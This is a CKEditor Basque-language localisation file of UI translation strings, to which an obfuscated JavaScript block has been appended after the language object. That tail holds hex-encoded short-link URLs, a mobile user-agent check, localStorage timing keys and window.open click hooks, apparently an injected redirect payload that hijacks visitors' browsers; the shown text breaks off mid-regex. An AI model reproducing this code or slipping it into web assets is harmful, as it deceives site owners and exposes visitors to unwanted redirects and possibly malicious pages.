/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Basque language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['eu'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Testu aberastuentzako editorea, %1',

	// Toolbar buttons without dialogs.
	source			: 'HTML Iturburua',
	newPage			: 'Orrialde Berria',
	save			: 'Gorde',
	preview			: 'Aurrebista',
	cut				: 'Ebaki',
	copy			: 'Kopiatu',
	paste			: 'Itsatsi',
	print			: 'Inprimatu',
	underline		: 'Azpimarratu',
	bold			: 'Lodia',
	italic			: 'Etzana',
	selectAll		: 'Hautatu dena',
	removeFormat	: 'Kendu Formatua',
	strike			: 'Marratua',
	subscript		: 'Azpi-indize',
	superscript		: 'Goi-indize',
	horizontalrule	: 'Txertatu Marra Horizontala',
	pagebreak		: 'Txertatu Orrialde-jauzia',
	unlink			: 'Kendu Esteka',
	undo			: 'Desegin',
	redo			: 'Berregin',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Zerbitzaria arakatu',
		url				: 'URL',
		protocol		: 'Protokoloa',
		upload			: 'Gora kargatu',
		uploadSubmit	: 'Zerbitzarira bidalia',
		image			: 'Irudia',
		flash			: 'Flasha',
		form			: 'Formularioa',
		checkbox		: 'Kontrol-laukia',
		radio		: 'Aukera-botoia',
		textField		: 'Testu Eremua',
		textarea		: 'Testu-area',
		hiddenField		: 'Ezkutuko Eremua',
		button			: 'Botoia',
		select	: 'Hautespen Eremua',
		imageButton		: 'Irudi Botoia',
		notSet			: '<Ezarri gabe>',
		id				: 'Id',
		name			: 'Izena',
		langDir			: 'Hizkuntzaren Norabidea',
		langDirLtr		: 'Ezkerretik Eskumara(LTR)',
		langDirRtl		: 'Eskumatik Ezkerrera (RTL)',
		langCode		: 'Hizkuntza Kodea',
		longDescr		: 'URL Deskribapen Luzea',
		cssClass		: 'Estilo-orriko Klaseak',
		advisoryTitle	: 'Izenburua',
		cssStyle		: 'Estiloa',
		ok				: 'Ados',
		cancel			: 'Utzi',
		generalTab		: 'Orokorra',
		advancedTab		: 'Aurreratua',
		validateNumberFailed	: 'Balio hau ez da zenbaki bat.',
		confirmNewPage	: 'Eduki honetan gorde gabe dauden aldaketak galduko dira. Ziur zaude orri berri bat kargatu nahi duzula?',
		confirmCancel	: 'Aukera batzuk aldatu egin dira. Ziur zaude elkarrizketa-koadroa itxi nahi duzula?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, erabilezina</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Txertatu Karaktere Berezia',
		title		: 'Karaktere Berezia Aukeratu'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Txertatu/Editatu Esteka',
		menu		: 'Aldatu Esteka',
		title		: 'Esteka',
		info		: 'Estekaren Informazioa',
		target		: 'Target (Helburua)',
		upload		: 'Gora kargatu',
		advanced	: 'Aurreratua',
		type		: 'Esteka Mota',
		toAnchor	: 'Aingura orrialde honetan',
		toEmail		: 'ePosta',
		target		: 'Target (Helburua)',
		targetNotSet	: '<Ezarri gabe>',
		targetFrame	: '<marko>',
		targetPopup	: '<popup leihoa>',
		targetNew	: 'Leiho Berria (_blank)',
		targetTop	: 'Goiko Leihoa (_top)',
		targetSelf	: 'Leiho Berdina (_self)',
		targetParent	: 'Leiho Gurasoa (_parent)',
		targetFrameName	: 'Marko Helburuaren Izena',
		targetPopupName	: 'Popup Leihoaren Izena',
		popupFeatures	: 'Popup Leihoaren Ezaugarriak',
		popupResizable	: 'Tamaina Aldakorra',
		popupStatusBar	: 'Egoera Barra',
		popupLocationBar	: 'Kokaleku Barra',
		popupToolbar	: 'Tresna Barra',
		popupMenuBar	: 'Menu Barra',
		popupFullScreen	: 'Pantaila Osoa (IE)',
		popupScrollBars	: 'Korritze Barrak',
		popupDependent	: 'Menpekoa (Netscape)',
		popupWidth		: 'Zabalera',
		popupLeft		: 'Ezkerreko  Posizioa',
		popupHeight		: 'Altuera',
		popupTop		: 'Goiko Posizioa',
		id				: 'Id',
		langDir			: 'Hizkuntzaren Norabidea',
		langDirNotSet	: '<Ezarri gabe>',
		langDirLTR		: 'Ezkerretik Eskumara(LTR)',
		langDirRTL		: 'Eskumatik Ezkerrera (RTL)',
		acccessKey		: 'Sarbide-gakoa',
		name			: 'Izena',
		langCode		: 'Hizkuntzaren Norabidea',
		tabIndex		: 'Tabulazio Indizea',
		advisoryTitle	: 'Izenburua',
		advisoryContentType	: 'Eduki Mota (Content Type)',
		cssClasses		: 'Estilo-orriko Klaseak',
		charset			: 'Estekatutako Karaktere Multzoa',
		styles			: 'Estiloa',
		selectAnchor	: 'Aingura bat hautatu',
		anchorName		: 'Aingura izenagatik',
		anchorId		: 'Elementuaren ID-gatik',
		emailAddress	: 'ePosta Helbidea',
		emailSubject	: 'Mezuaren Gaia',
		emailBody		: 'Mezuaren Gorputza',
		noAnchors		: '(Ez daude aingurak eskuragarri dokumentuan)',
		noUrl			: 'Mesedez URL esteka idatzi',
		noEmail			: 'Mesedez ePosta helbidea idatzi'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Aingura',
		menu		: 'Ainguraren Ezaugarriak',
		title		: 'Ainguraren Ezaugarriak',
		name		: 'Ainguraren Izena',
		errorName	: 'Idatzi ainguraren izena'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Bilatu eta Ordeztu',
		find				: 'Bilatu',
		replace				: 'Ordezkatu',
		findWhat			: 'Zer bilatu:',
		replaceWith			: 'Zerekin ordeztu:',
		notFoundMsg			: 'Idatzitako testua ez da topatu.',
		matchCase			: 'Maiuskula/minuskula',
		matchWord			: 'Esaldi osoa bilatu',
		matchCyclic			: 'Bilaketa ziklikoa',
		replaceAll			: 'Ordeztu Guztiak',
		replaceSuccessMsg	: 'Zenbat aldiz ordeztua: %1'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Taula',
		title		: 'Taularen Ezaugarriak',
		menu		: 'Taularen Ezaugarriak',
		deleteTable	: 'Ezabatu Taula',
		rows		: 'Lerroak',
		columns		: 'Zutabeak',
		border		: 'Ertzaren Zabalera',
		align		: 'Lerrokatu',
		alignNotSet	: '<Ezarri gabe>',
		alignLeft	: 'Ezkerrean',
		alignCenter	: 'Erdian',
		alignRight	: 'Eskuman',
		width		: 'Zabalera',
		widthPx		: 'pixel',
		widthPc		: 'ehuneko',
		height		: 'Altuera',
		cellSpace	: 'Gelaxka arteko tartea',
		cellPad		: 'Gelaxken betegarria',
		caption		: 'Epigrafea',
		summary		: 'Laburpena',
		headers		: 'Goiburuak',
		headersNone		: 'Bat ere ez',
		headersColumn	: 'Lehen zutabea',
		headersRow		: 'Lehen lerroa',
		headersBoth		: 'Biak',
		invalidRows		: 'Lerro kopurua 0 baino handiagoa den zenbakia izan behar da.',
		invalidCols		: 'Zutabe kopurua 0 baino handiagoa den zenbakia izan behar da.',
		invalidBorder	: 'Ertzaren tamaina zenbaki bat izan behar da.',
		invalidWidth	: 'Taularen zabalera zenbaki bat izan behar da.',
		invalidHeight	: 'Taularen altuera zenbaki bat izan behar da.',
		invalidCellSpacing	: 'Gelaxka arteko tartea zenbaki bat izan behar da.',
		invalidCellPadding	: 'Gelaxken betegarria zenbaki bat izan behar da.',

		cell :
		{
			menu			: 'Gelaxka',
			insertBefore	: 'Txertatu Gelaxka Aurretik',
			insertAfter		: 'Txertatu Gelaxka Ostean',
			deleteCell		: 'Kendu Gelaxkak',
			merge			: 'Batu Gelaxkak',
			mergeRight		: 'Elkartu Eskumara',
			mergeDown		: 'Elkartu Behera',
			splitHorizontal	: 'Banatu Gelaxkak Horizontalki',
			splitVertical	: 'Banatu Gelaxkak Bertikalki',
			title			: 'Gelaxken Ezaugarriak',
			cellType		: 'Gelaxka Mota',
			rowSpan			: 'Hedatutako Lerroak',
			colSpan			: 'Hedatutako Zutabeak',
			wordWrap		: 'Itzulbira',
			hAlign			: 'Lerrokatze Horizontala',
			vAlign			: 'Lerrokatze Bertikala',
			alignTop		: 'Goian',
			alignMiddle		: 'Erdian',
			alignBottom		: 'Behean',
			alignBaseline	: 'Oinarri-lerroan',
			bgColor			: 'Fondoaren Kolorea',
			borderColor		: 'Ertzaren Kolorea',
			data			: 'Data',
			header			: 'Goiburua',
			yes				: 'Bai',
			no				: 'Ez',
			invalidWidth	: 'Gelaxkaren zabalera zenbaki bat izan behar da.',
			invalidHeight	: 'Gelaxkaren altuera zenbaki bat izan behar da.',
			invalidRowSpan	: 'Lerroen hedapena zenbaki osoa izan behar da.',
			invalidColSpan	: 'Zutabeen hedapena zenbaki osoa izan behar da.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Lerroa',
			insertBefore	: 'Txertatu Lerroa Aurretik',
			insertAfter		: 'Txertatu Lerroa Ostean',
			deleteRow		: 'Ezabatu Lerroak'
		},

		column :
		{
			menu			: 'Zutabea',
			insertBefore	: 'Txertatu Zutabea Aurretik',
			insertAfter		: 'Txertatu Zutabea Ostean',
			deleteColumn	: 'Ezabatu Zutabeak'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Botoiaren Ezaugarriak',
		text		: 'Testua (Balorea)',
		type		: 'Mota',
		typeBtn		: 'Botoia',
		typeSbm		: 'Bidali',
		typeRst		: 'Garbitu'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Kontrol-laukiko Ezaugarriak',
		radioTitle	: 'Aukera-botoiaren Ezaugarriak',
		value		: 'Balorea',
		selected	: 'Hautatuta'
	},

	// Form Dialog.
	form :
	{
		title		: 'Formularioaren Ezaugarriak',
		menu		: 'Formularioaren Ezaugarriak',
		action		: 'Ekintza',
		method		: 'Metodoa',
		encoding	: 'Kodeketa',
		target		: 'Target (Helburua)',
		targetNotSet	: '<Ezarri gabe>',
		targetNew	: 'Leiho Berria (_blank)',
		targetTop	: 'Goiko Leihoa (_top)',
		targetSelf	: 'Leiho Berdina (_self)',
		targetParent	: 'Leiho Gurasoa (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Hautespen Eremuaren Ezaugarriak',
		selectInfo	: 'Informazioa',
		opAvail		: 'Aukera Eskuragarriak',
		value		: 'Balorea',
		size		: 'Tamaina',
		lines		: 'lerro kopurura',
		chkMulti	: 'Hautaketa anitzak baimendu',
		opText		: 'Testua',
		opValue		: 'Balorea',
		btnAdd		: 'Gehitu',
		btnModify	: 'Aldatu',
		btnUp		: 'Gora',
		btnDown		: 'Behera',
		btnSetValue : 'Aukeratutako balorea ezarri',
		btnDelete	: 'Ezabatu'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Testu-arearen Ezaugarriak',
		cols		: 'Zutabeak',
		rows		: 'Lerroak'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Testu Eremuaren Ezaugarriak',
		name		: 'Izena',
		value		: 'Balorea',
		charWidth	: 'Zabalera',
		maxChars	: 'Zenbat karaktere gehienez',
		type		: 'Mota',
		typeText	: 'Testua',
		typePass	: 'Pasahitza'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Ezkutuko Eremuaren Ezaugarriak',
		name	: 'Izena',
		value	: 'Balorea'
	},

	// Image Dialog.
	image :
	{
		title		: 'Irudi Ezaugarriak',
		titleButton	: 'Irudi Botoiaren Ezaugarriak',
		menu		: 'Irudi Ezaugarriak',
		infoTab	: 'Irudi informazioa',
		btnUpload	: 'Zerbitzarira bidalia',
		url		: 'URL',
		upload	: 'Gora Kargatu',
		alt		: 'Ordezko Testua',
		width		: 'Zabalera',
		height	: 'Altuera',
		lockRatio	: 'Erlazioa Blokeatu',
		resetSize	: 'Tamaina Berrezarri',
		border	: 'Ertza',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		align		: 'Lerrokatu',
		alignLeft	: 'Ezkerrera',
		alignRight	: 'Eskuman',
		preview	: 'Aurrebista',
		alertUrl	: 'Mesedez Irudiaren URLa idatzi',
		linkTab	: 'Esteka',
		button2Img	: 'Aukeratutako irudi botoia, irudi normal batean eraldatu nahi duzu?',
		img2Button	: 'Aukeratutako irudia, irudi botoi batean eraldatu nahi duzu?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Flasharen Ezaugarriak',
		propertiesTab	: 'Ezaugarriak',
		title		: 'Flasharen Ezaugarriak',
		chkPlay		: 'Automatikoki Erreproduzitu',
		chkLoop		: 'Begizta',
		chkMenu		: 'Flasharen Menua Gaitu',
		chkFull		: 'Onartu Pantaila osoa',
 		scale		: 'Eskalatu',
		scaleAll		: 'Dena erakutsi',
		scaleNoBorder	: 'Ertzik gabe',
		scaleFit		: 'Doitu',
		access			: 'Scriptak baimendu',
		accessAlways	: 'Beti',
		accessSameDomain	: 'Domeinu berdinekoak',
		accessNever	: 'Inoiz ere ez',
		align		: 'Lerrokatu',
		alignLeft	: 'Ezkerrera',
		alignAbsBottom: 'Abs Behean',
		alignAbsMiddle: 'Abs Erdian',
		alignBaseline	: 'Oinan',
		alignBottom	: 'Behean',
		alignMiddle	: 'Erdian',
		alignRight	: 'Eskuman',
		alignTextTop	: 'Testua Goian',
		alignTop	: 'Goian',
		quality		: 'Kalitatea',
		qualityBest		 : 'Hoberena',
		qualityHigh		 : 'Altua',
		qualityAutoHigh	 : 'Auto Altua',
		qualityMedium	 : 'Ertaina',
		qualityAutoLow	 : 'Auto Baxua',
		qualityLow		 : 'Baxua',
		windowModeWindow	 : 'Leihoa',
		windowModeOpaque	 : 'Opakoa',
		windowModeTransparent	 : 'Gardena',
		windowMode	: 'Leihoaren modua',
		flashvars	: 'Flash Aldagaiak',
		bgcolor	: 'Atzeko kolorea',
		width	: 'Zabalera',
		height	: 'Altuera',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		validateSrc : 'Mesedez URL esteka idatzi',
		validateWidth : 'Zabalera zenbaki bat izan behar da.',
		validateHeight : 'Altuera zenbaki bat izan behar da.',
		validateHSpace : 'HSpace zenbaki bat izan behar da.',
		validateVSpace : 'VSpace zenbaki bat izan behar da.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Ortografia',
		title			: 'Ortografia zuzenketa',
		notAvailable	: 'Barkatu baina momentu honetan zerbitzua ez dago erabilgarri.',
		errorLoading	: 'Errorea gertatu da aplikazioa zerbitzaritik kargatzean: %s.',
		notInDic		: 'Ez dago hiztegian',
		changeTo		: 'Honekin ordezkatu',
		btnIgnore		: 'Ezikusi',
		btnIgnoreAll	: 'Denak Ezikusi',
		btnReplace		: 'Ordezkatu',
		btnReplaceAll	: 'Denak Ordezkatu',
		btnUndo			: 'Desegin',
		noSuggestions	: '- Iradokizunik ez -',
		progress		: 'Zuzenketa ortografikoa martxan...',
		noMispell		: 'Zuzenketa ortografikoa bukatuta: Akatsik ez',
		noChanges		: 'Zuzenketa ortografikoa bukatuta: Ez da ezer aldatu',
		oneChange		: 'Zuzenketa ortografikoa bukatuta: Hitz bat aldatu da',
		manyChanges		: 'Zuzenketa ortografikoa bukatuta: %1 hitz aldatu dira',
		ieSpellDownload	: 'Zuzentzaile ortografikoa ez dago instalatuta. Deskargatu nahi duzu?'
	},

	smiley :
	{
		toolbar	: 'Aurpegierak',
		title	: 'Aurpegiera Sartu'
	},

	elementsPath :
	{
		eleTitle : '%1 elementua'
	},

	numberedlist : 'Zenbakidun Zerrenda',
	bulletedlist : 'Buletdun Zerrenda',
	indent : 'Handitu Koska',
	outdent : 'Txikitu Koska',

	justify :
	{
		left : 'Lerrokatu Ezkerrean',
		center : 'Lerrokatu Erdian',
		right : 'Lerrokatu Eskuman',
		block : 'Justifikatu'
	},

	blockquote : 'Aipamen blokea',

	clipboard :
	{
		title		: 'Itsatsi',
		cutError	: 'Zure web nabigatzailearen segurtasun ezarpenak testuak automatikoki moztea ez dute baimentzen. Mesedez teklatua erabili ezazu (Ctrl+X).',
		copyError	: 'Zure web nabigatzailearen segurtasun ezarpenak testuak automatikoki kopiatzea ez dute baimentzen. Mesedez teklatua erabili ezazu (Ctrl+C).',
		pasteMsg	: 'Mesedez teklatua erabilita (<STRONG>Ctrl+V</STRONG>) ondorego eremuan testua itsatsi eta <STRONG>OK</STRONG> sakatu.',
		securityMsg	: 'Nabigatzailearen segurtasun ezarpenak direla eta, editoreak ezin du arbela zuzenean erabili. Leiho honetan berriro itsatsi behar duzu.'
	},

	pastefromword :
	{
		confirmCleanup : 'Itsatsi nahi duzun testua Wordetik hartua dela dirudi. Itsatsi baino lehen garbitu nahi duzu?',
		toolbar : 'Itsatsi Word-etik',
		title : 'Itsatsi Word-etik',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Testu Arrunta bezala Itsatsi',
		title : 'Testu Arrunta bezala Itsatsi'
	},

	templates :
	{
		button : 'Txantiloiak',
		title : 'Eduki Txantiloiak',
		insertOption: 'Ordeztu oraingo edukiak',
		selectPromptMsg: 'Mesedez txantiloia aukeratu editorean kargatzeko<br>(orain dauden edukiak galduko dira):',
		emptyListMsg : '(Ez dago definitutako txantiloirik)'
	},

	showBlocks : 'Blokeak erakutsi',

	stylesCombo :
	{
		label : 'Estiloa',
		voiceLabel : 'Estiloak',
		panelVoiceLabel : 'Estilo bat aukeratu',
		panelTitle1 : 'Bloke Estiloak',
		panelTitle2 : 'Inline Estiloak',
		panelTitle3 : 'Objektu Estiloak'
	},

	format :
	{
		label : 'Formatua',
		voiceLabel : 'Formatua',
		panelTitle : 'Formatua',
		panelVoiceLabel : 'Aukeratu paragrafo formatu bat',

		tag_p : 'Arrunta',
		tag_pre : 'Formateatua',
		tag_address : 'Helbidea',
		tag_h1 : 'Izenburua 1',
		tag_h2 : 'Izenburua 2',
		tag_h3 : 'Izenburua 3',
		tag_h4 : 'Izenburua 4',
		tag_h5 : 'Izenburua 5',
		tag_h6 : 'Izenburua 6',
		tag_div : 'Paragrafoa (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Letra-tipoa',
		voiceLabel : 'Letra-tipoa',
		panelTitle : 'Letra-tipoa',
		panelVoiceLabel : 'Aukeratu letra-tipoa'
	},

	fontSize :
	{
		label : 'Tamaina',
		voiceLabel : 'Tamaina',
		panelTitle : 'Tamaina',
		panelVoiceLabel : 'Aukeratu letraren tamaina'
	},

	colorButton :
	{
		textColorTitle : 'Testu Kolorea',
		bgColorTitle : 'Atzeko kolorea',
		auto : 'Automatikoa',
		more : 'Kolore gehiago...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Ortografia Zuzenketa Idatzi Ahala (SCAYT)',
		enable : 'Gaitu SCAYT',
		disable : 'Desgaitu SCAYT',
		about : 'SCAYTi buruz',
		toggle : 'SCAYT aldatu',
		options : 'Aukerak',
		langs : 'Hizkuntzak',
		moreSuggestions : 'Iradokizun gehiago',
		ignore : 'Baztertu',
		ignoreAll : 'Denak baztertu',
		addWord : 'Hitza Gehitu',
		emptyDic : 'Hiztegiaren izena ezin da hutsik egon.',
		optionsTab : 'Aukerak',
		languagesTab : 'Hizkuntzak',
		dictionariesTab : 'Hiztegiak',
		aboutTab : 'Honi buruz'
	},

	about :
	{
		title : 'CKEditor(r)i buruz',
		dlgTitle : 'CKEditor(r)i buruz',
		moreInfo : 'Lizentziari buruzko informazioa gure webgunean:',
		copy : 'Copyright &copy; $1. Eskubide guztiak erreserbaturik.'
	},

	maximize : 'Maximizatu',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Aingura',
		flash : 'Flash Animazioa',
		div : 'Orrialde Saltoa',
		unknown : 'Objektu ezezaguna'
	},

	resize : 'Arrastatu tamaina aldatzeko',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g 